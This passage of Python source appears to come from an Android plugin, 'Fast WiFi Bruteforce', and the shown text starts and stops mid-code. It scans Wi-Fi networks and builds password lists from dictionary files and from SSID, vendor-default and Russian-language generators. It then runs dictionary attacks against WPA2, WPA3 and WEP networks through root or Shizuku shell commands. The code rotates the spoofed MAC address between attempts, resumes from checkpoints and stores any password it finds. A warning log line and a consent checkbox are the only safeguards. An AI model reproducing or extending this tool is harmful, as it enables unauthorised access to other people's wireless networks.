        self._log("info", "Fast WiFi Bruteforce {} loaded".format(__version__))
        self._log_mode_summary()
        self._log("warning",
                  "Test only your own networks "
                  "or networks with the owner's permission.")

    def _log_mode_summary(self):
        try:
            if self._root_available and self._wpa_cli_available:
                self._log("success",
                          "Mode: ROOT · wpa_cli + MAC + PMKID + saved")
            elif self._root_available:
                self._log("success", "Mode: ROOT (without wpa_cli)")
            elif self._shell_mode == "shizuku":
                self._log("success",
                          "Mode: SHIZUKU · UID " + (self._uid or "?"))
            else:
                self._log("warning",
                          "Mode: view only (no root/Shizuku)")
        except Exception:
            pass

    def on_plugin_unload(self):
        self._ready = False
        self._running = False
        self._stop.set()
        try:
            self._stop_rssi_sampler()
        except Exception:
            pass
        try:
            self._save()
        except Exception:
            pass
        self._found_password = ""
        self._reveal = False
        self._password_pool = []
        with self._recent_lock:
            self._recent = []

    def _detect_shell_mode(self):
        try:
            uid = self._try_shell_uid("shizuku")
            if uid in ("2000", "0"):
                self._shell_mode = "shizuku"
                self._uid = uid
                return
        except Exception:
            pass

        api = getattr(self, "api", None)
        if api is not None:
            try:
                dev = api.getDevice()
            except Exception:
                dev = None
            if dev is not None:
                avail = self._call_or_prop(dev, "shizukuAvailable")
                perm = self._call_or_prop(dev, "shizukuHasPermission")
                self._log("info",
                          "Shizuku: available={}, permission={}".format(
                              avail, perm))

        try:
            uid = self._try_shell_uid("root")
            if uid == "0":
                self._shell_mode = "root"
                self._uid = "0"
                return
        except Exception:
            pass

        self._shell_mode = "none"
        self._uid = ""

    def _launch(self, job, kind="io"):
        if not self._ready:
            return
        if self._busy or (self._thread is not None and self._thread.is_alive()):
            self._toast("Wait for the current operation to finish")
            return

        self._stop.clear()
        self._busy = True
        self._running = kind == "audit"
        self._scanning = kind == "scan"

        def worker():
            try:
                if self._ready:
                    job()
            except Exception as exc:
                if not self._stop.is_set():
                    self._outcome = "Error: " + str(exc)[:160]
                    self._log("error", "worker: " + str(exc)[:240])
            finally:
                self._running = False
                self._scanning = False
                self._busy = False
                self._refresh(force=True)

        try:
            self._thread = threading.Thread(target=worker, daemon=True)
            self._thread.start()
        except Exception:
            self._busy = False
            self._running = False
            self._scanning = False
            raise

        self._refresh(force=True)

    def _shell(self, command, sensitive=False, allow_failure=False,
               hide_command_only=False):
        if not self._ready or self._stop.is_set():
            raise RuntimeError("Operation cancelled")
        if self._shell_mode == "none":
            raise RuntimeError("No Shizuku or root — shell unavailable")

        hide_cmd = sensitive or hide_command_only
        self._log("info",
                  "$ [command hidden]" if hide_cmd else "$ " + command)

        try:
            with self._shell_lock:
                if self._stop.is_set():
                    raise RuntimeError("Operation cancelled")
                if self._shell_mode == "shizuku":
                    result = self.shizuku(command)
                elif self._shell_mode == "root":
                    result = self.root(command)
                else:
                    raise RuntimeError("No shell available")

            if result is None:
                raise RuntimeError("shell returned None")

            if isinstance(result, bytes):
                result = self._text(result)

            if isinstance(result, str) and result.lstrip().startswith("{"):
                try:
                    decoded = json.loads(result)
                    if isinstance(decoded, dict):
                        result = decoded
                except (ValueError, TypeError):
                    pass

            stderr = ""
            if isinstance(result, dict):
                stdout = ""
                for key in ("out", "stdout", "output"):
                    if result.get(key) is not None:
                        stdout = self._text(result[key])
                        break
                stderr = self._text(
                    result.get("err") if result.get("err") is not None
                    else result.get("stderr"))
                failed = result.get("ok") is False
                code = None
                for key in ("code", "exitCode", "exit_code", "returncode"):
                    if result.get(key) is not None:
                        code = result[key]
                        break
                if code is not None:
                    try:
                        failed = failed or int(code) != 0
                    except (ValueError, TypeError):
                        pass
                if failed and not allow_failure:
                    raise RuntimeError((stderr or stdout or "shell error")[:240])
            else:
                stdout = self._text(result)

            combined = stdout + "\n" + stderr
            if self.SHELL_HARD_ERROR.search(combined) and not allow_failure:
                raise RuntimeError((stderr or stdout or "shell error")[:240])

            preview = (stdout or stderr).strip()
            if preview:
                self._log("info",
                          "Output: " + preview.replace("\n", " ⏎ ")[:300])
            else:
                self._log("info", "Empty output")

            return stdout

        except Exception:
            raise

    def _require_shell(self):
        if self._shell_mode == "none":
            raise RuntimeError("Shizuku or root not found.")
        if self._shell_mode == "unknown":
            self._detect_shell_mode()
            if self._shell_mode == "none":
                raise RuntimeError("Shizuku or root not found.")
        if not self._uid:
            try:
                self._uid = self._try_shell_uid(self._shell_mode)
            except Exception:
                self._uid = ""

    def _diagnose(self):
        self._detect_shell_mode()
        self._detect_root()
        if self._root_available:
            self._find_wpa_cli()
            self._find_hashcat()
            self._detect_wpa_ctrl()
        self._log("info", "Shell mode: " + self._shell_mode)
        self._log("info", "Root: " + ("yes" if self._root_available else "none"))
        self._log("info", "wpa_cli: " + (self._wpa_cli_path or "none"))
        self._log("info", "hashcat: " + (self._hashcat_path or "none"))
        self._log("info", "wpa_ctrl: " + (self._wpa_ctrl_dir or "none"))

        if self._shell_mode == "none":
            self._outcome = "Diagnostics: view only"
            return

        try:
            self._require_shell()
            help_text = self._shell("cmd wifi help", allow_failure=True)
            has_connect = "connect-network" in help_text
            has_wpa2 = "wpa2" in (help_text or "").lower()
            has_wpa3 = "wpa3" in (help_text or "").lower()
            has_wep = "wep" in (help_text or "").lower()
            self._cmd_ok = has_connect

            extras = []
            if has_wpa2:
                extras.append("WPA2")
            if has_wpa3:
                extras.append("WPA3")
            if has_wep:
                extras.append("WEP")

            if not has_connect:
                self._log("error", "connect-network command not found")
            else:
                self._log("success",
                          "connect-network OK · " + ", ".join(extras))

            probe = self._shell("cmd wifi connect-network 2>&1",
                                allow_failure=True)
            first_line = (probe or "").strip().splitlines()
            first_line = first_line[0][:200] if first_line else "(empty)"
            self._log("info", "probe: " + first_line)

            self._shell("cmd wifi status", allow_failure=True)
            self._outcome = ("Diagnostics: OK · mode " + self._shell_mode
                             + (" + root" if self._root_available else "")
                             if self._cmd_ok
                             else "Diagnostics: limited")
        except Exception as exc:
            self._log("error", "diagnose: " + str(exc)[:200])
            self._outcome = "Diagnostics: error"

    def _stop_work(self):
        if not self._busy:
            return
        self._running = False
        self._stop.set()
        try:
            if self._checked > 0:
                self._save_checkpoint()
        except Exception:
            pass
        self._outcome = "Stopping…"
        self._log("warning", "Stop requested; checkpoint saved")

    def _toggle_help(self):
        self._show_help = not self._show_help
        self._refresh(force=True)

    # ═══════════ SCANNING ═══════════

    @staticmethod
    def _security(flags):
        flags = (flags or "").upper()
        if not flags:
            return "unknown"
        if any(tag in flags for tag in ("EAP", "802.1X", "IEEE8021X")):
            return "eap"
        if "SAE" in flags:
            return "sae"
        if "PSK" in flags and ("WPA2" in flags or "RSN" in flags):
            return "psk"
        if "WEP" in flags:
            return "wep"
        if any(tag in flags for tag in
               ("WPA", "RSN", "OWE", "PSK", "DPP", "?")):
            return "other"
        return "open" if "[ESS]" in flags else "unknown"

    @staticmethod
    def _band(frequency):
        if 2400 <= frequency < 2500:
            return "2.4 GHz"
        if 4900 <= frequency < 5925:
            return "5 GHz"
        if 5925 <= frequency <= 7125:
            return "6 GHz"
        return "{} MHz".format(frequency)

    @staticmethod
    def _signal(rssi):
        if rssi >= -55:
            return "▂▄▆█  Excellent"
        if rssi >= -67:
            return "▂▄▆░  Good"
        if rssi >= -75:
            return "▂▄░░  Fair"
        return "▂░░░  Weak"

    @classmethod
    def _parse_scan_line(cls, line):
        match = cls.SCAN_PREFIX.match(line)
        if not match:
            return None
        tail = match.group("tail")
        ssid = ""
        flags = ""
        if (len(tail) >= 33 and tail[32].isspace()
                and tail[33:].lstrip().startswith("[")):
            ssid = tail[:32].strip()
            flags = tail[33:].strip()
        else:
            flag_match = cls.FLAGS_SUFFIX.search(tail)
            if flag_match:
                ssid = tail[:flag_match.start()].strip()
                flags = flag_match.group("flags").strip()
            else:
                ssid = tail.strip()
        frequency = int(match.group("frequency"))
        rssi = int(match.group("rssi"))
        if not 0 < frequency < 100000 or not -127 <= rssi <= 0:
            return None
        return {
            "ssid": ssid,
            "bssid": match.group("bssid").lower(),
            "frequency": frequency,
            "rssi": rssi,
            "age": match.group("age"),
            "flags": flags,
            "security": cls._security(flags),
        }

    @classmethod
    def _self_test_parser(cls):
        cases = [
            ("aa:bb:cc:dd:ee:01 2412 -48 0.125 Home WiFi [WPA2-PSK-CCMP][ESS]",
             "Home WiFi", -48, "psk"),
            ("aa:bb:cc:dd:ee:02 5180 -61(0:-62/1:-60) 1.250 Office [RSN-PSK-CCMP][ESS]",
             "Office", -61, "psk"),
            ("aa:bb:cc:dd:ee:03 2462 -72(0: -73) ___?___ Guest [ESS]",
             "Guest", -72, "open"),
            ("aa:bb:cc:dd:ee:04 5975 -54 0.010 "
             + "{:<32} {}".format("WiFi [Home]", "[RSN-SAE-CCMP][ESS]"),
             "WiFi [Home]", -54, "sae"),
            ("0c:80:63:4e:70:a4 5180 -42(0:-44/1:-46) 3.391    "
             + "{:<32} {}".format("Xiaomi_59A9", "[WPA2-PSK-CCMP-128][ESS]"),
             "Xiaomi_59A9", -42, "psk"),
        ]
        for line, ssid, rssi, security in cases:
            parsed = cls._parse_scan_line(line)
            if (parsed is None or parsed["ssid"] != ssid
                    or parsed["rssi"] != rssi
                    or parsed["security"] != security):
                raise RuntimeError(
                    "Internal parser self-test failed: '{}' → {}".format(
                        ssid, parsed))

    def _scan_via_api(self):
        try:
            dev = self.api.getDevice()
            raw = dev.wifiScanResultsJson()
            if raw is None:
                return []
            if isinstance(raw, bytes):
                raw = raw.decode("utf-8", errors="replace")
            if isinstance(raw, str):
                try:
                    data = json.loads(raw)
                except Exception:
                    return []
            else:
                data = raw
            if not isinstance(data, list):
                return []
            records = {}
            for item in data:
                if not isinstance(item, dict):
                    continue
                bssid = (item.get("BSSID") or item.get("bssid") or "").lower()
                if not bssid:
                    continue
                ssid = (item.get("SSID") or item.get("ssid") or "").strip()
                try:
                    rssi = int(item.get("level") or item.get("RSSI")
                               or item.get("rssi") or -100)
                except (ValueError, TypeError):
                    rssi = -100
                try:
                    freq = int(item.get("frequency") or 0)
                except (ValueError, TypeError):
                    freq = 0
                caps = str(item.get("capabilities") or "")
                records[bssid] = {
                    "ssid": ssid, "bssid": bssid,
                    "frequency": freq, "rssi": rssi,
                    "age": "0", "flags": caps,
                    "security": self._security(caps),
                }
            return list(records.values())
        except Exception as exc:
            self._log("warning", "wifiScanResultsJson: " + str(exc)[:180])
            return []

    def _begin_scan(self):
        if self._busy:
            self._toast("Finish the current operation first")
            return
        self._page = "networks"
        self._launch(self._scan, "scan")

    def _scan(self):
        self._outcome = "Scanning Wi-Fi…"
        self._scan_attempted = True
        networks = []
        
        # Clear old data before a new scan
        self._scan_raw = ""
        self._scan_time = ""
        self._scan_source = ""

        if self._shell_mode in ("shizuku", "root"):
            self._scan_source = "shell"
            try:
                self._require_shell()
                try:
                    self._shell("cmd wifi start-scan", allow_failure=True)
                except Exception:
                    pass
                if self._stop.wait(2.0):
                    self._outcome = "Scanning stopped"
                    return
                output = self._shell("cmd wifi list-scan-results",
                                     allow_failure=True)
                if self._stop.is_set():
                    return
                self._scan_raw = output[:50000]
                records = {}
                unmatched = 0
                for line in output.splitlines():
                    if self._stop.is_set():
                        self._outcome = "Scanning stopped"
                        return
                    item = self._parse_scan_line(line)
                    if item is None:
                        if self.MAC_PREFIX.match(line):
                            unmatched += 1
                        continue
                    records[item["bssid"]] = item
                networks = list(records.values())
                self._scan_unparsed = unmatched
            except Exception as exc:
                self._log("warning", "shell scan: " + str(exc)[:180])
                networks = []

        if not networks:
            self._scan_source = "api"
            self._log("info", "Scan via API…")
            try:
                dev = self.api.getDevice()
                try:
                    dev.wifiStartScan()
                except Exception:
                    pass
                if self._stop.wait(2.0):
                    self._outcome = "Scanning stopped"
                    return
            except Exception:
                pass
            networks = self._scan_via_api()
            self._scan_unparsed = 0
            if not self._scan_raw:
                self._scan_raw = "(scan via API, no shell)"

        if self._stop.is_set():
            self._outcome = "Scanning stopped"
            return

        networks.sort(key=lambda x: x["rssi"], reverse=True)
        self._networks = networks[:self.MAX_RESULTS]
        self._scan_time = time.strftime("%H:%M:%S")
        self._outcome = "Networks found: {}".format(len(networks))

        self._log("success" if networks else "warning",
                  "{}. Source: {}.".format(self._outcome, self._scan_source))
        if networks:
            self._toast("Networks found.")
        self._refresh(force=True)

    def _select_network(self, network):
        if self._busy:
            self._toast("Select after the operation finishes")
            return
        if not network.get("ssid"):
            self._toast("A hidden network has no SSID")
            return
        clean = dict(network)
        try:
            clean["ssid"] = str(clean["ssid"]).strip()
        except Exception:
            pass
        self._network = clean
        self._target_sec = self._sec_for_connect(clean.get("security", ""))
        self._found_password = ""
        self._reveal = False
        self._consent = False
        self._checked = 0
        self._total = 0
        self._speed = 0.0
        self._eta = 0.0
        self._finished = False
        self._pmkid_hash = ""
        self._pmkid_ssid = ""
        self._pmkid_bssid = ""
        self._pmkid_hex = ""
        with self._rssi_lock:
            self._rssi_samples = []
        self._outcome = "Network selected: " + clean["ssid"]
        self._save()
        self._toast("Selected: " + clean["ssid"])
        self._page = "main"

    @staticmethod
    def _sec_for_connect(security):
        if security == "sae":
            return "wpa3"
        if security == "wep":
            return "wep"
        return "wpa2"

    def _set_filter(self, value):
        self._network_filter = self._text(value)[:100]

    def _toggle_raw(self):
        self._show_raw = not self._show_raw

    # ═══════════ FILES ═══════════

    def _open_browser(self, path=None):
        if self._busy:
            self._toast("Wait for the operation to finish")
            return
        destination = self._path(path or self._folder)
        self._page = "browser"
        self._launch(lambda: self._browse(destination))

    def _browse(self, path):
        self._require_shell()
        path = self._path(path)
        output = self._shell("ls -1F {} 2>&1 | head -100".format(self._shq(path)))
        if any(m in output for m in
               ("Permission denied", "No such file", "Not a directory")):
            raise RuntimeError("Directory unavailable: " + path)

        entries = []
        for name in output.splitlines()[:self.MAX_RESULTS]:
            if not name or name in (".", "..", "./", "../"):
                continue
            is_folder = name.endswith("/")
            if is_folder:
                name = name[:-1]
            elif name.endswith(("@", "|", "=", "*")):
                continue
            if "/" in name:
                continue
            entries.append({
                "name": name,
                "path": self._path(os.path.join(path, name)),
                "folder": is_folder,
            })

        if self._stop.is_set():
            return
        self._folder = path
        self._files = sorted(entries,
                             key=lambda x: (not x["folder"],
                                            x["name"].casefold()))
        self._save()

    def _set_query(self, value):
        if not self._busy:
            self._query = self._text(value)[:100]

    def _set_depth(self, value):
        if not self._busy:
            self._depth = max(2, min(6, int(round(float(value)))))

    def _search_files(self, all_files=False):
        self._require_shell()
        query = "" if all_files else self._query.strip()
        query = (query.replace("[", "[[]").replace("*", "[*]")
                 .replace("?", "[?]"))
        pattern = "*" + query + "*.txt"
        output = self._shell(
            "find /sdcard/ -maxdepth {} -type f -iname {} "
            "2>/dev/null | head -100".format(self._depth, self._shq(pattern))
        )
        paths = []
        for line in output.splitlines()[:self.MAX_RESULTS]:
            if self._stop.is_set():
                return
            try:
                path = self._path(line)
            except Exception:
                continue
            if path not in paths:
                paths.append(path)
        self._results = paths
        self._log("info", "Files found: {}".format(len(paths)))

    def _read_dictionary(self, path):
        self._require_shell()
        path = self._path(path)
        quoted = self._shq(path)
        size_text = self._shell(
            "[ -f {0} ] && stat -c %s {0}".format(quoted)).strip()
        try:
            size = int(size_text)
        except (TypeError, ValueError):
            raise RuntimeError("Failed to determine the file size")
        if not 0 <= size <= self.MAX_FILE:
            raise RuntimeError("Dictionary size limit: 10 MB")

        text = self._shell("head -c {} {}".format(self.MAX_FILE + 1, quoted),
                           sensitive=True, hide_command_only=True)
        if len(text.encode("utf-8")) > self.MAX_FILE:
            raise RuntimeError("File exceeds the limit")
        if "\x00" in text or "\ufffd" in text:
            raise RuntimeError("UTF-8 without NUL required")

        passwords = []
        count = 0
        with io.StringIO(text.lstrip("\ufeff")) as stream:
            for line in stream:
                if self._stop.is_set():
                    raise RuntimeError("Reading stopped")
                password = line[:-1] if line.endswith("\n") else line
                if password.endswith("\r"):
                    password = password[:-1]
                count += 1
                if self._valid_password(password):
                    passwords.append(password)
                    if len(passwords) > self.MAX_PASSWORDS:
                        raise RuntimeError("Password limit")
        metadata = {
            "path": path,
            "name": os.path.basename(path),
            "count": count,
            "valid": len(passwords),
        }
        return metadata, passwords

    def _import_dictionary(self, path):
        self._require_shell()
        path = self._path(path)
        if path not in self._dicts and len(self._dicts) >= self.MAX_DICTS:
            raise RuntimeError("Maximum of 16 dictionaries")
        metadata, passwords = self._read_dictionary(path)
        passwords.clear()
        if self._stop.is_set():
            return
        self._dicts[path] = metadata
        if path not in self._enabled_dicts:
            self._enabled_dicts.append(path)
        self._save()
        self._log("success", "Added {}: {} lines, {} valid.".format(
            metadata["name"], metadata["count"], metadata["valid"]))
        self._toast("Dictionary added")

    def _enable_dictionary(self, path, value):
        if self._busy or path not in self._dicts:
            return
        enabled = self._bool(value)
        if enabled and path not in self._enabled_dicts:
            self._enabled_dicts.append(path)
        elif not enabled:
            self._enabled_dicts = [x for x in self._enabled_dicts if x != path]
        self._save()

    def _delete_dictionary(self, path):
        if self._busy:
            return
        self._dicts.pop(path, None)
        self._enabled_dicts = [x for x in self._enabled_dicts if x != path]
        self._save()
        self._log("info", "Dictionary removed from the list")

    def _load_password_pool(self):
        combined = []
        seen = set()
        duplicates = 0
        for path in list(self._enabled_dicts):
            if self._stop.is_set():
                raise RuntimeError("Loading stopped")
            if path not in self._dicts:
                continue
            metadata, passwords = self._read_dictionary(path)
            self._dicts[path] = metadata
            for pw in passwords:
                if pw in seen:
                    duplicates += 1
                    continue
                seen.add(pw)
                combined.append(pw)
                if len(combined) > self.MAX_PASSWORDS:
                    combined.clear()
                    seen.clear()
                    raise RuntimeError("Total password limit")
            passwords.clear()

        if self._use_ssid_gen:
            gen = self._generate_from_ssid(self._network.get("ssid", ""))
            added = 0
            for pw in gen:
                if pw in seen:
                    continue
                seen.add(pw)
                combined.append(pw)
                added += 1
                if len(combined) > self.MAX_PASSWORDS:
                    break
            self._log("info", "SSID generator: +{} candidates".format(added))

        if self._use_vendor_gen:
            gen = self._vendor_defaults_for_bssid(
                self._network.get("bssid", ""))
            added = 0
            for pw in gen:
                if pw in seen:
                    continue
                seen.add(pw)
                combined.append(pw)
                added += 1
                if len(combined) > self.MAX_PASSWORDS:
                    break
            self._log("info", "Vendor generator: +{} candidates".format(added))

        if self._use_ru_gen or self._use_morph:
            gen = self._generate_ru_candidates(
                self._network.get("ssid", ""))
            added = 0
            for pw in gen:
                if pw in seen:
                    continue
                seen.add(pw)
                combined.append(pw)
                added += 1
                if len(combined) > self.MAX_PASSWORDS:
                    break
            self._log("info", "RU generator: +{} candidates".format(added))

        if duplicates > 0:
            self._log("info",
                      "Deduplication: {} duplicates skipped".format(duplicates))
        self._password_pool = combined
        return combined

    # ═══════════ NETWORK TEST ═══════════

    @staticmethod
    def _connected_ssid(output):
        for line in str(output or "").splitlines():
            match = re.match(r"^\s*Wifi is connected to\s+(.+?)\s*$",
                             line, re.IGNORECASE)
            if match:
                ssid = match.group(1)
                if len(ssid) >= 2 and ssid[0] == ssid[-1] == '"':
                    ssid = ssid[1:-1]
                return ssid
        return None

    def _set_consent(self, value):
        if not self._busy:
            self._consent = self._bool(value)

    def _set_settle(self, value):
        if not self._busy:
            self._settle = max(self.MIN_SETTLE,
                               min(self.MAX_SETTLE,
                                   round(float(value), 1)))
            self._save()

    def _set_manual(self, value):
        if not self._busy:
            self._manual_password = self._text(value)[:200]

    def _toggle_ssid_gen(self, value):
        if not self._busy:
            self._use_ssid_gen = self._bool(value)
            self._save()

    def _toggle_vendor_gen(self, value):
        if not self._busy:
            self._use_vendor_gen = self._bool(value)
            self._save()

    def _toggle_ru_gen(self, value):
        if not self._busy:
            self._use_ru_gen = self._bool(value)
            self._save()

    def _toggle_morph(self, value):
        if not self._busy:
            self._use_morph = self._bool(value)
            self._save()

    def _toggle_adaptive(self, value):
        if not self._busy:
            self._use_adaptive_settle = self._bool(value)
            self._save()

    def _toggle_notify(self, value):
        self._notify_on_found = self._bool(value)
        self._save()

    def _toggle_resume(self, value):
        self._resume_enabled = self._bool(value)
        self._save()

    def _toggle_mac_spoof(self, value):
        self._use_mac_spoof = self._bool(value)
        self._save()

    def _set_spoof_every(self, value):
        if not self._busy:
            self._spoof_every = max(5, min(50, int(round(float(value)))))
            self._save()

    def _effective_settle(self):
        if not self._use_adaptive_settle:
            return self._settle
        with self._rssi_lock:
            n = len(self._settle_samples)
        if n < self.SETTLE_MIN_SAMPLES:
            return self._settle
        try:
            samples = sorted(self._settle_samples)
            idx = int(len(samples) * 0.9)
            idx = min(idx, len(samples) - 1)
            p90 = samples[idx]
            return max(self.MIN_SETTLE,
                       min(self.MAX_SETTLE, round(p90 + 0.5, 1)))
        except Exception:
            return self._settle

    def _try_password(self, target, password, settle):
        if self._stop.is_set():
            return None

        if self._wpa_cli_available and self._root_available and self._wpa_net_id:
            if self._use_mac_spoof and self._spoof_count % self._spoof_every == 0:
                self._spoof_mac()
            self._spoof_count += 1
            fast = self._try_password_wpa_cli(password, settle)
            if fast is not None:
                if fast:
                    return True
                try:
                    self._wpa_cli("disable_network {}".format(self._wpa_net_id))
                except Exception:
                    pass
                return False

        t0 = time.monotonic()
        cmd_sec = self._target_sec
        try:
            raw = self._shell(
                "cmd wifi connect-network {} {} {}".format(
                    self._shq(target), cmd_sec, self._shq(password)),
                sensitive=True, allow_failure=True)
        except RuntimeError as exc:
            if "Operation cancelled" in str(exc):
                return None
            self._log("warning", "connect-network: " + str(exc)[:180])
            return False

        raw_text = (raw or "").strip()
        raw_low = raw_text.lower()
        self._last_connect_reply = raw_text[:200]

        if ("failure" in raw_low or "invalid" in raw_low
                or "wrong password" in raw_low):
            return False

        poll = self.POLL_INTERVAL
        seen_connecting = False
        not_connected_streak = 0.0
        deadline = t0 + settle

        while time.monotonic() < deadline:
            if self._stop.is_set():
                return None
            try:
                status = self._shell("cmd wifi status", allow_failure=True)
            except Exception:
                status = ""

            if re.search(r'Wifi is connected to\s+"?' +
                         re.escape(target) + r'"?\s*$', status, re.M):
                return True

            if ('Wifi is connecting to' in status
                    or 'Supplicant state: ASSOCIATING' in status
                    or 'Supplicant state: AUTHENTICATING' in status
                    or 'Supplicant state: FOUR_WAY_HANDSHAKE' in status):
                seen_connecting = True
                not_connected_streak = 0.0
            elif 'Wifi is not connected' in status:
                not_connected_streak += poll
                if (not seen_connecting
                        and not_connected_streak >= self.QUICK_FAIL_AFTER):
                    return False
            else:
                not_connected_streak = 0.0

            if self._stop.wait(poll):
                return None

        return False

    def _start_audit(self):
        self._log("info", "=== Audit start ===")
        self._log("info", "consent={}, network={}, dicts={}".format(
            self._consent,
            bool(self._network.get("ssid")),
            len(self._enabled_dicts)))

        if self._busy:
            self._toast("Wait for the operation to finish")
            return

        if self._shell_mode == "none":
            self._outcome = "Refused: no Shizuku or root"
            self._toast("Bruteforce unavailable — Shizuku or root required")
            self._toggle_help()
            self._refresh(force=True)
            return

        sec = self._network.get("security", "")
        if sec not in ("psk", "sae", "wep"):
            self._outcome = "Refused: type {} not supported".format(sec)
            self._toast("Select a WPA2/WPA3/WEP network")
            self._refresh(force=True)
            return

        if not self._consent:
            self._outcome = "Refused: no confirmation"
            self._toast("Confirm authorization")
            self._refresh(force=True)
            return

        if not self._network.get("ssid"):
            self._outcome = "Refused: no network selected"
            self._toast("Select a network first")
            self._refresh(force=True)
            return

        if (not self._enabled_dicts and not self._use_ssid_gen
                and not self._use_vendor_gen and not self._use_ru_gen
                and not self._use_morph):
            self._outcome = "Refused: no password sources"
            self._toast("Add a dictionary or generator")
            self._refresh(force=True)
            return

        self._target_sec = self._sec_for_connect(sec)
        self._checked = 0
        self._total = 0
        self._speed = 0.0
        self._eta = 0.0
        self._found_password = ""
        self._reveal = False
        self._finished = False
        self._spoof_count = 0
        self._settle_samples = deque(maxlen=30)
        with self._recent_lock:
            self._recent = []
        self._outcome = "Loading dictionaries…"

        self._resume_from = 0
        if self._resume_enabled:
            cp = self._load_checkpoint()
            if (cp and cp.get("ssid") == self._network.get("ssid", "")
                    and cp.get("dict_fp") == self._dict_fingerprint()):
                self._resume_from = int(cp.get("checked", 0))
                if self._resume_from > 0:
                    self._log("info",
                              "Resuming from #{}".format(self._resume_from))

        target = self._network["ssid"]
        if self._wpa_cli_available and self._root_available:
            ok = self._setup_wpa_cli_network(target, sec)
            if ok:
                self._log("success", "Audit via wpa_cli (reattach)")
            else:
                self._log("info", "wpa_cli setup failed — fallback cmd wifi")
        settle = self._effective_settle()
        self._log("info", "Starting for: " + target)
        self._launch(lambda: self._audit_worker(target, settle), "audit")

    def _audit_worker(self, target, settle):
        try:
            self._log("atk", "Step 1: shell")
            self._require_shell()
            self._log("atk", "Step 2: mode={}, UID={}, root={}, wpa_cli={}".format(
                self._shell_mode, self._uid or "?",
                "yes" if self._root_available else "none",
                "yes" if self._wpa_cli_available else "none"))

            self._log("atk", "Step 3: connection check")
            status0 = self._shell("cmd wifi status", allow_failure=True)
            connected_now = self._connected_ssid(status0)
            if connected_now == target:
                raise RuntimeError(
                    "Already connected to this network. Disconnect manually.")
            if connected_now:
                self._log("info", "Now: " + str(connected_now)[:60])
            else:
                self._log("info", "Not connected to any network")

            self._log("atk", "Step 4: probe")
            probe = self._shell("cmd wifi connect-network 2>&1",
                                allow_failure=True)
            probe_first = (probe or "").strip().splitlines()
            probe_first = probe_first[0][:160] if probe_first else "(empty)"
            self._log("atk", "probe: " + probe_first)

            if "unknown command" in probe_first.lower():
                self._cmd_ok = False
                raise RuntimeError("No connect-network command")
            self._cmd_ok = True
            self._log("atk", "Step 5: command available")

            self._log("atk", "Step 6: dictionaries")
            passwords = self._load_password_pool()
            self._total = len(passwords)
            self._log("atk", "Step 7: {} passwords".format(self._total))

            if self._stop.is_set():
                self._outcome = "Stopped"
                return
            if not passwords:
                raise RuntimeError("No valid passwords")

            skip = 0
            if self._resume_from > 0 and self._resume_from < self._total:
                skip = self._resume_from
                self._checked = skip
                self._log("info", "Resume: skipping {}".format(skip))

            self._outcome = "Check in progress"
            self._log("warning",
                      "Failure to connect does not prove the password "
                      "is wrong. A connection is only a candidate.")

            started = time.monotonic()
            self._refresh(force=True)

            for idx, password in enumerate(passwords):
                if idx < skip:
                    continue
                if self._stop.is_set() or not self._running:
                    break

                current_settle = self._effective_settle()
                t0 = time.monotonic()
                observed = self._try_password(target, password, current_settle)
                elapsed_attempt = time.monotonic() - t0

                if self._stop.is_set():
                    break

                if elapsed_attempt > 0.5:
                    try:
                        self._settle_samples.append(elapsed_attempt)
                    except Exception:
                        pass

                self._checked += 1
                elapsed = max(time.monotonic() - started, 0.001)
                self._speed = self._checked / elapsed
                remaining = self._total - self._checked
                self._eta = (remaining / self._speed) if self._speed > 0 else 0.0

                with self._recent_lock:
                    self._recent.append(
                        (self._checked, self._mask_last4(password),
                         bool(observed), int(elapsed_attempt * 1000)))
                    self._recent = self._recent[-self.MAX_RECENT:]

                if observed:
                    self._found_password = password
                    self._reveal = True
                    self._page = "main"
                    self._finished = True
                    self._outcome = "✅ Password found!"
                    self._log("success", "Connected to SSID. Candidate.")
                    try:
                        self.set_setting(self.FOUND_KEY, {
                            "ssid": self._network.get("ssid", ""),
                            "bssid": self._network.get("bssid", ""),
                            "password": password,
                            "ts": time.time(),
                        })
                    except Exception:
                        pass
                    self._toast("✅ Password found")
                    try:
                        self._notify_found(self._network.get("ssid", ""),
                                           password)
                    except Exception:
                        pass
                    self._refresh(force=True)
                    break

                if self._checked % self.CHECKPOINT_EVERY == 0:
                    self._save_checkpoint()

                if self._checked % self.LOG_EVERY_N == 0:
                    self._log("info",
                              "{} of {}; {:.2f} p/s; settle {:.1f}; ~{}".format(
                                  self._checked, self._total, self._speed,
                                  self._effective_settle(),
                                  self._format_eta(self._eta)))

                self._refresh(force=False)

                if (self._checked < self._total
                        and self._stop.wait(self.INTER_ATTEMPT_DELAY)):
                    break

            self._finished = True
            if self._stop.is_set():
                self._outcome = "Stopped"
                if self._checked > 0:
                    self._save_checkpoint()
            elif not self._found_password:
                self._outcome = "❌ Password not found"
                self._clear_checkpoint()
                self._toast("Password not found")
            else:
                self._clear_checkpoint()

        except Exception as exc:
            self._finished = True
            if self._stop.is_set():
                self._outcome = "Stopped"
            else:
                self._outcome = "Check interrupted: " + str(exc)[:160]
                self._log("error", "audit_worker: " + str(exc)[:240])
        finally:
            self._running = False
            if self._wpa_net_id:
                try:
                    self._wpa_cli("remove_network {}".format(self._wpa_net_id))
                    self._wpa_cli("save_config")
                except Exception:
                    pass
                self._wpa_net_id = ""
            self._refresh(force=True)

    def _test_single_password(self):
        if self._busy:
            self._toast("Wait for the operation to finish")
            return
        if self._shell_mode == "none":
            self._manual_result = "No shell — testing unavailable"
            self._toggle_help()
            self._refresh(force=True)
            return
        password = self._manual_password
        if not password:
            self._toast("Enter a password")
            return

        sec = self._network.get("security", "")
        if sec == "wep":
            if not self._valid_wep(password):
                self._manual_result = "WEP: 10/26/32 hex"
                self._refresh(force=True)
                return
        else:
            if not self._valid_password(password):
                self._manual_result = "8..63 characters or 64 hex"
                self._refresh(force=True)
                return

        if sec not in ("psk", "sae", "wep"):
            self._manual_result = "Select a WPA2/WPA3/WEP network"
            self._refresh(force=True)
            return
        if not self._consent:
            self._manual_result = "Confirm authorization"
            self._refresh(force=True)
            return

        target = self._network["ssid"]
        self._target_sec = self._sec_for_connect(sec)
        settle = self._effective_settle()
        self._manual_busy = True
        self._manual_result = "Testing…"

        def job():
            try:
                self._require_shell()
                status0 = self._shell("cmd wifi status", allow_failure=True)
                if self._connected_ssid(status0) == target:
                    self._manual_result = "Already connected"
                    return
                ok = self._try_password(target, password, settle)
                if ok is True:
                    self._manual_result = "✅ Connected"
                    self._found_password = password
                    self._reveal = True
                elif ok is False:
                    self._manual_result = "❌ Password rejected"
                else:
                    self._manual_result = "⚠️ Inconclusive, try again"
